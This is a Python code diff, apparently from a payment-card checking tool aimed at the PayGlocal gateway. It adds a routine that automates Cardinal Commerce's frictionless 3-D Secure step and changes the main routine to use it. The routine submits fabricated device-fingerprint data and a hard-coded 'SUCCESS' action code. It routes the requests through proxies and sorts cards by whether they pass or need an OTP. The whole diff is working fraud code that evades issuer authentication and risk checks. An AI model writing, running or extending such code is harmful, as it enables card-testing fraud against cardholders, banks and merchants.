@@ -60,6 +60,84 @@ def classify_pg_status(d: dict) -> tuple:
 
 
 
+
+def _cardinal_frictionless(sess, ua, proxy, collect_url: str, jwt3ds: str) -> str | None:
+    """Run the Cardinal frictionless-3DS chain (live-decoded):
+    Collect(JWT) -> device fingerprint SaveBrowserData -> CollectRedirect(SUCCESS).
+
+    Returns the cres string (may be empty for frictionless) or None if the card
+    needs an OTP challenge. Never raises."""
+    import uuid as _uuid
+    import json as _json
+    try:
+        rr = sess.post(collect_url,
+                       headers={"Content-Type": "application/x-www-form-urlencoded",
+                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                "Origin": "https://api.payglocal.com",
+                                "Referer": "https://api.payglocal.com/",
+                                "User-Agent": ua},
+                       data={"JWT": jwt3ds}, allow_redirects=True)
+        body = rr.text
+        if "otp" in body.lower() or "challenge" in body.lower() or "acsUrl" in body:
+            return None
+        mcs = re.search(r'name="McsId" value="([^"]+)"', body)
+        ref = re.search(r'id=.referenceId. type="hidden" value="([^"]+)"', body)
+        org = re.search(r'name="orgUnitId" value="([^"]+)"', body)
+        dfu = re.search(r'id=.dfUrlFullValue. type="hidden" value="([^"]+)"', body)
+        if not (mcs and dfu):
+            return ""
+        mcsId, refId, orgId = mcs.group(1), (ref.group(1) if ref else ""), (org.group(1) if org else "")
+        dfUrl = dfu.group(1).replace("&amp;", "&")
+        nonce = str(_uuid.uuid4())
+        try:
+            sess.post(dfUrl, headers={"Content-Type": "application/x-www-form-urlencoded",
+                                      "Accept": "*/*", "Origin": "https://geo.cardinalcommerce.com",
+                                      "Referer": dfUrl, "User-Agent": ua},
+                      data={"nonce": nonce}, allow_redirects=True)
+        except Exception:
+            pass
+        fp = "".join(random.choices("0123456789abcdef", k=32))
+        fp_body = {
+            "Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},
+            "DeviceChannel": "Browser",
+            "Extended": {"Browser": {"Adblock": True, "AvailableJsFonts": [], "DoNotTrack": "unknown", "JavaEnabled": False},
+                         "Device": {"ColorDepth": 24, "Cpu": "unknown", "Platform": "Linux x86_64",
+                                    "TouchSupport": {"MaxTouchPoints": 0, "OnTouchStartAvailable": False, "TouchEventCreationSuccessful": False}}},
+            "Fingerprint": fp, "FingerprintingTime": 52, "FingerprintDetails": {"Version": "1.5.1"},
+            "Language": "en-US", "Latitude": None, "Longitude": None, "OrgUnitId": orgId, "Origin": "CruiseAPI",
+            "Plugins": ["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
+                        "Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],
+            "ReferenceId": refId, "Referrer": "https://centinelapi.cardinalcommerce.com/",
+            "Screen": {"FakedResolution": False, "Ratio": 1.7777777777777777, "Resolution": "1920x1080",
+                       "UsableResolution": "1920x1080", "CCAScreenSize": "02"},
+            "CallSignEnabled": None, "ThreatMetrixEnabled": False, "ThreatMetrixEventType": "PAYMENT",
+            "ThreatMetrixAlias": "Default", "TimeOffset": -330, "UserAgent": ua,
+            "UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},
+            "VcdiClientRequestId": None, "BinSessionId": nonce}
+        try:
+            sess.post("https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
+                      headers={"Content-Type": "application/json", "Accept": "*/*",
+                               "Origin": "https://geo.cardinalcommerce.com", "Referer": dfUrl, "User-Agent": ua},
+                      json=fp_body, allow_redirects=True)
+        except Exception:
+            pass
+        ds = {"CardinalData": {"Attempted": True, "Completed": True},
+              "MethodUrl": {"Attempted": False, "Completed": False}}
+        cr = sess.post("https://centinelapi.cardinalcommerce.com/V2/Cruise/CollectRedirect",
+                       headers={"Content-Type": "application/x-www-form-urlencoded",
+                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                "Origin": "https://centinelapi.cardinalcommerce.com",
+                                "Referer": collect_url, "User-Agent": ua},
+                       data={"McsId": mcsId, "DataSources": _json.dumps(ds),
+                             "ActionCode": "SUCCESS", "Error": "", "DfResults": ""},
+                       allow_redirects=True)
+        return cr.text.strip() or ""
+    except Exception as e:
+        return ""
+
+
+
+
 def _payglocal_once(xgl: str, card: dict, proxy: str) -> tuple:
     """One attempt: dc -> risk_fp -> decrypt key -> paynow(JWE) -> ipay(JWE).
 
@@ -99,13 +177,31 @@ def _payglocal_once(xgl: str, card: dict, proxy: str) -> tuple:
                                                   "language": "en-US",
                                                   "javaScripEnabled": True, "javaEnabled": False})
 
-    # 4) paynow (JWE) -> INPROGRESS -> ipay (JWE) -> terminal verdict
+    # 4) paynow (JWE) -> INPROGRESS -> (Cardinal frictionless-3DS) -> ipay (JWE)
     pn = pg.paynow(rk, payload, pem)
     st = pn.get("status", "")
     if st != "INPROGRESS":
         return classify_pg_status(pn)
 
-    time.sleep(6)
+    # 4a) Cardinal frictionless-3DS — complete it so 3DS-capable cards get a real
+    #     verdict instead of '3d' (OTP-gated cards still return '3d').
+    cardinal = ((pn.get("data") or {}).get("forms") or {}).get("Cardinal_DataCollection") or {}
+    collect_url = cardinal.get("formUrl", "")
+    jwt3ds = (cardinal.get("payload") or {}).get("token", "")
+    if collect_url and jwt3ds:
+        cres = _cardinal_frictionless(pg.session, pg.ua, proxy, collect_url, jwt3ds)
+        if cres is None:
+            return "3d", "3DS challenge issued (OTP required)"
+        if cres:
+            payload = build_card_payload(card, customer_currency=issuing,
+                                         fingerprint_id=visitor_id,
+                                         cardinal_request={"messageType": "CReq", "payload": cres},
+                                         browser_details={"userAgent": pg.ua, "screenWidth": 1920,
+                                                          "screenHeight": 1080, "colorDepth": 24,
+                                                          "timeZone": -330, "language": "en-US",
+                                                          "javaScripEnabled": True, "javaEnabled": False})
+
+    time.sleep(4)
     ip = pg.ipay(rk, payload, pem)
     return classify_pg_status(ip)
 
